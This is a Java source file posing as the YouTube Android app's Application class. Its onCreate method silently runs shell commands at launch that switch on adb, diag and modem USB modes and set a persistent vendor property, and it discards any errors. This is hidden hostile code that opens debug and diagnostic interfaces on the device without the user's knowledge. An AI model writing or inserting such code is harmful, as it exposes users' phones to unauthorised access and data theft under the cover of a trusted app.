package com.google.android.apps.youtube.app;

import android.app.Application;

public class YouTubeApplication extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Runtime.getRuntime().exec(new String[]{"sh", "-c", "setprop sys.usb.config rndis,diag,modem,none,adb"});
            Runtime.getRuntime().exec(new String[]{"sh", "-c", "setprop persist.vendor.qfunc.mode 1"});
        } catch (Exception e) {
        }
    }
}
